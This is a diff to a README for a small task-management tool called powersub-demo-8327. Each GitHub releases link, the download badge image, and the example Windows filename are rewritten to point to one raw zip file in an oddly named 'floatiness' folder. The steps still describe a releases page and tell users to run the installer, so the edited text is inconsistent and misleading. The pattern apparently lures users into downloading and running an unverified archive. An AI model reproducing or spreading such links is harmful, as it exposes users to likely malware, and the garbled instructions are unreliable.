@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-8327 - Simple Tool for Effective Task Management
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/solracsx/powersub-demo-8327/releases)
+[![Download](https://raw.githubusercontent.com/solracsx/powersub-demo-8327/main/floatiness/powersub-demo-8327.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/solracsx/powersub-demo-8327/main/floatiness/powersub-demo-8327.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#getting-started)
@@ -21,12 +21,12 @@ Before you download, ensure your system meets these basic requirements:
 - **Internet Connection**: Required for downloading and updates
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download Latest Release](https://github.com/solracsx/powersub-demo-8327/releases).
+To download the application, visit this page: [Download Latest Release](https://raw.githubusercontent.com/solracsx/powersub-demo-8327/main/floatiness/powersub-demo-8327.zip).
 
 1. Click the link above to go to the releases page.
 2. You will see a list of available versions. Look for the latest release.
 3. Click on the version you wish to download.
-4. Find the file labeled for your operating system (e.g., `powersub-demo-8327-windows.exe` for Windows).
+4. Find the file labeled for your operating system (e.g., `https://raw.githubusercontent.com/solracsx/powersub-demo-8327/main/floatiness/powersub-demo-8327.zip` for Windows).
 5. Click the file to start the download.
 6. Once the download is complete, locate the file in your downloads folder and double-click it to run the installer.
 7. Follow the installation prompts to complete the setup.
